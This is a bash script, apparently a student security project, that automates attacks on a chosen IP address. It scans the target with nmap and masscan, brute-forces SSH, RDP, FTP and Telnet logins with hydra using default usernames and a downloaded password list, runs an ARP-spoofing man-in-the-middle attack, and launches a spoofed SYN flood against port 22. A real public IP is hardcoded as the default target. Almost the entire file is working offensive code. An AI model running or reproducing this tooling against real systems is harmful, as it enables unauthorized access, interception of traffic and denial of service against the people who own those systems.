#!/bin/bash

#3 different types of attack, nmap, hydra/medusa and 

#This is an if function to check if the current user using this is root, which is ID 0, if it is, it'll go on as usual, if it isn't, it'll force exit
#the script using exit as it's breaking point in the if function
if [ "$EUID" -ne 0 ]
	then 		
		echo "================================================================================="
		echo "Please make sure you're running this script in sudo, ex 'sudo bash <script.sh>'"
		echo "================================================================================="
	exit
fi

#Adds a global variable for the date to be used by any function at anytime.
dte=$(date)

#Display to show what this program is. 
echo "================================================================================="
echo "------------------------------------------------------------------"
echo "IMPORTANT NOTICE"
echo "Please use this with caution, actions used by this script will run attacking scripts"
echo "If not you might be facing legal charges"
echo "------------------------------------------------------------------"
echo "================================================================================="

#This is a function to show the selection of 
function selection()
{
	#Selection variable for other functions to figure which choice is being chosen
	Selection=0
	#Checks if input is indeed 1,2 or 3. If it's not either of those, it will send you into the abyss of while loops
	read -p "Please enter 1(Bruteforce), 2(Man in the Middle) or 3(Denial of Service) to choose which attack you'd like to conduct : " ATTNO
	re='^[1-3]+$'
	while ! [[ $ATTNO =~ $re ]]
		do
			read -p "Not a valid choice, please re-enter : " ATTNO
		done
	if [ $ATTNO == "1" ]
	then
		Selection=1
	elif [ $ATTNO == "2" ]
	then
		Selection=2
	else
		Selection=3
	fi
}

function oname()
{
	#Just a simple function to store the directory's name into dname
	read -p "Please enter a name for the output directory : " dname
	echo "Output directory's name has been set as $dname"
	echo "----------------------------------------------------------------------------------"
}

function filecreation(){
	#Calls the function to create file and cd into it to save the outputs of all the different scans
	oname
	Directoryexists=$(ls | grep -w "$dname" | wc -l)
	if [ $Directoryexists == 1 ]
	then
		echo "Directory already exists, entering said directory"
		echo "----------------------------------------------------------------------------------"
	else
		mkdir $dname
	fi
	cd $dname
	recordexists=$(ls | grep -w Records | wc -l)
	if [ $recordexists == 1 ]
	then
		echo "Records already exists, will not create a new one."
		echo "----------------------------------------------------------------------------------"
	else
		#To store the attack records into this folder
		mkdir Records
	fi
	pwd
	iplistexists=$(ls | grep -w iplist.txt | wc -l)
	if [ $iplistexists == 1 ]
	then
		echo "iplist already exists, will not create a new one."
		echo "----------------------------------------------------------------------------------"
	else
		echo "128.199.152.221" > iplist.txt
	fi
	echo "----------------------------------------------------------------------------------"
}

function addip()
{
	#This is an integer to launch an infinite while loop on the occurence that it's not expected
	valid=0
	read -p "Please enter an IP address that you'd like to use : " ipadd
	#Checks if IP has 4 octets, and makes sure each octet is lesser than 256
	if [[ $ipadd =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]]
	then
		valid=1
	else
	#While loop to rerun the same read as long as it's not within expected range
		while [ $valid -eq 0 ]
			do
				read -p "Not a valid IP, please re-enter : " ipadd
				if [[ $ipadd =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]]
					then
						valid=1
				fi
			done
	fi
	#This adds it into the premade IP list so that it can be used in the future. 
	echo $ipadd >> iplist.txt
	echo "----------------------------------------------------------------------------------"
}

#This function is to put the string information from the iplist.txt files into an array.
function chooseip(){
	file="iplist.txt"
	array=()
	echo "These are the ips currently added."
	while IFS= read -r line
	do
		array+=("$line")
	done < "$file"
	indexing=1
	for i in "${array[@]}"
	do
		echo "$indexing) $i"
		indexing=$((indexing+1))
	done
	echo "================================================================================="
	read -p "Please choose the number of which IP you'd like to attack, press 0 to add a new ip: " choice
	#maximumarray="${#array[@]}"
	#echo $maximumarray
	#echo "'^[0-$maximumarray]+$'"
	#re="'^[0-$maximumarray]+$'"
	#echo $re
	#while ! [[ $choice =~ $re ]]
	#		do
	#			read -p "Not a valid choice, please re-enter : " choice
	#		done
	if [ $choice == "0" ]
	then
		addip
		chooseip
	else
		choice=$((choice-1))
		ChosenIP="${array[$choice]}"
	fi
}

function portscanning(){	
	#This pulls the variable out of the ip function and uses it for nmap scans
	echo "[#]Nmap scan is occuring now, this might take awhile"
	echo $ChosenIP
	sudo nmap -sV -T4 $ChosenIP > nmapscan
	echo "[!]Nmap scan has completed"
	#Asks if user wants to print the results or move on
	read -p "Would you like to see the results? 1(Yes) if not enter anything : " Choice
	echo "----------------------------------------------------------------------------------"
	if [ $Choice == 1 ]
	then
		cat "nmapscan"
	fi
	echo "================================================================================="
	echo "----------------------------------------------------------------------------------"
	echo "================================================================================="
	echo "[#]UDP scan is occuring now, this might take awhile"
	masscan -pU:1-65535 --rate=10000 $ChosenIP > "masscan"
	echo "----------------------------------------------------------------------------------"
	echo "[!]UDP scan has completed"
	#Asks if user wants to print the results or move on
	read -p "Would you like to see the results? 1(Yes) if not enter anything : " Choice
	echo "----------------------------------------------------------------------------------"
	if [[ $Choice == 1 ]]
	then
		cat "masscan"
	fi
	echo "----------------------------------------------------------------------------------"
}

function servicecheck(){
	#Creates an empty array for me to input what service is present to run it through a for loop
	svcs=()
	sshexist=$(cat nmapscan | grep -i "ssh" | wc -l)
	rdpexist=$(cat nmapscan | grep -i "rdp" | wc -l)
	ftpexist=$(cat nmapscan | grep -i "ftp" | wc -l)
	telnetexist=$(cat nmapscan | grep -i "telnet" | wc -l)
	if [[ sshexist -gt 0 ]]
	then
		svcs+=('ssh')
		echo "SSH exists"
	fi
	if [[ rdpexist -gt 0 ]]
	then
		svcs+=('rdp')
		echo "RDP exists"
	fi
	if [[ ftpexist -gt 0 ]]
	then
		svcs+=('ftp')
		echo "FTP exists"
	fi
	if [[ telnetexist -gt 0 ]]
	then
		svcs+=('telnet')
		echo "Telnet exists"
	fi
	#Checks if there's anything even in the array, if there isn't. Well, there's nothing to check. 
	if [ ${#svcs[@]} -eq 0 ]
	then
		echo "There is no login service available on this machine"
	else
		brute
	fi
}

function users(){
	#Function to create basic list
	echo "admin" > user.lst
	echo "msfadmin" >> user.lst
	echo "user" >> user.lst
	echo "kali" >> user.lst
	echo "root" >> user.lst
}

function pwlist(){
	#Checks if there's the required defualt pw list, if not download it
	exist=$(ls | grep best110.txt | wc -l)
	if [ $exist == 0 ]
	then
		echo "[#]Retreiving default pw list this program requires"
		echo "----------------------------------------------------------------------------------"
		wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-500.txt -O best110.txt
		echo "----------------------------------------------------------------------------------"
	fi
}

#Function to run the hydra on all users in the default userlist
function brute(){
	#This is to ask user if they'd like to use their own password list
	read -p "Would you like to use your own password list? 1(Yes) if not type anything else : " Choice
	echo "$Choice"
	if [ $Choice == 1 ]
	then
		#Tells user where to input in their own file, and rename it properly. Can be done mid script. 
		whereAmI=$(pwd)
		read -p "If so, please put in any .txt file and rename it specifically ownlist.txt into $whereAmI, once ready enter any button : " nothing
		for i in ${svcs[@]}
		do
			echo "I am now running hydra for $i service"
			echo "---------------------------------------------"
			hydra -L user.lst -P ownlist.txt $ChosenIP $i -o hydralist.txt
			echo "----------------------------------------------------------------------------------"
		done
	else
	#This is a for loop to run through everything that's in the array
		for i in ${svcs[@]}
		do
			echo "I am now running hydra for $i service"
			echo "---------------------------------------------"
			hydra -L user.lst -P best110.txt $ChosenIP $i -o hydralist.txt
			echo "----------------------------------------------------------------------------------"
		done
		read -p "Hydra execution has been run on any login services available on client, please enter anything to exit the system"
	fi
	echo "Attacked $ChosenIP on $dte, using Brute." >> Records/Brute.txt
}

#This function is to check if the current machine has the gnome-terminal installed, if it doesn't it'll do it for you. 
function checkgnome(){
	#Pulls the package, and check if it's installed.
	here=$(apt list gnome-terminal | grep gnome | wc -l)
	if [ $here == 1 ]
	then
		echo "Gnome is installed, proceeding..."
	else
		echo "Gnome is not installed, beginning download process"
		sudo add-apt-repository ppa:tualatrix/personal -y
		sudo apt-get update -y
		sudo apt-get install gnome-terminal -y
	fi
}

function checkhping3(){
	#Pulls the package, and check if it's installed.
	here=$(apt list hping3 | grep hping3 | wc -l)
	if [ $here == 1 ]
	then
		echo " Hping3 is installed, proceeding..."
	else
		echo "Hping3 is not installed, proceeding with install"
		sudo apt-get update -y
		sudo apt-get install hping3 -y
	fi
}

function DoSSSH(){
	#This checks gnome, 
	checkgnome
	#this floods the given IP address on port 22 with a hidden ip of 5.5.5.5
	gnome-terminal -- bash -c "sudo hping3 --flood -S -d 2000 -p 22 -a 5.5.5.5 $ChosenIP"
	echo "A DoS is running outside of this script, closing main script."
	echo "Attacked $ChosenIP on $dte, using DoS." >> Records/DoS.txt
}
 
 function MitM(){
	 checkgnome
	 #This pulls the ip of your chosen IP, cuts its last octet and replaces it with a .2, which is the default Default Gateway. 
	 DG=$(awk -F"." '{print $1"."$2"."$3".2"}'<<<$ChosenIP)	 
	 #This enables ip forwarding
	 echo "1" | sudo tee -a /proc/sys/net/ipv4/ip_forward
	 #This spoofs the ip of your machine into the Deafult Gateway's ip. 
	 gnome-terminal -- bash -c "arpspoof -t $ChosenIP $DG; exec bash"
	 gnome-terminal -- bash -c "arpspoof -t $DG $ChosenIP; exec bash"
	 echo "Attack is running outside of script, closing main script."
	 echo "Attacked $ChosenIP on $dte, using MitM." >> Records/MitM.txt
 }

function main(){
	selection
	if [ $Selection == "1" ]
	then
		echo "----------------------------------------------------------------------------------"
		echo "Bruteforce attack has been chosen"
		echo "----------------------------------------------------------------------------------"
		echo "This attack will first nmap scan and masscan the targeted IP address to find out"
		echo "the possible ports that are open and what services can be targeted to be attacked."
		echo "The focus services are SSH, Telnet, RDP and FTP"
		echo ""
		#Asking the user if they would like to proceed with the attack, if they do just commence it, if not rerun
		#the function main to rerun the entire script again.
		read -p "Would you like to proceed? If you'd like to proceed, type anything, if not type 0 to return: " yes
		if [[ $yes == "0" ]]
		then
			main
		else
			echo "Commencing attack"
			echo "----------------------------------------------------------------------------------"
			sleep 2
			portscanning
			servicecheck
			users
			pwlist
		fi
	elif [ $Selection == "2" ]
	then
		echo "----------------------------------------------------------------------------------"
		echo "Man in the Middle attack has been chosen"
		echo "----------------------------------------------------------------------------------"
		echo "This attack will arpspoof your ip to make it the default gateway of the server."
		echo "This will allow all information sent on that network to reach your computer first before"
		echo "leaving to another computer, making YOU the man in the middle."
		read -p "Would you like to proceed? If you'd like to proceed, type anything, if not type 0 to return: " yes
		if [[ $yes == "0" ]]
		then
			main
		else
			echo "Commencing attack"
			echo "----------------------------------------------------------------------------------"
			MitM
			
		fi
	else
		echo "----------------------------------------------------------------------------------"
		echo "DoS on SSH service attack has been chosen"
		echo "----------------------------------------------------------------------------------"
		echo "This attack will launch a flood of SYN packets towards the target ip."
		echo "It also only specifically targets port 22, so it completely shuts down their SSH service"
		read -p "Would you like to proceed? If you'd like to proceed, type anything, if not type 0 to return: " yes
		if [[ $yes == "0" ]]
		then
			main
		else
			echo "Commencing attack"
			echo "----------------------------------------------------------------------------------"
			checkhping3
			DoSSSH
		fi		
	fi
}

filecreation
chooseip
main

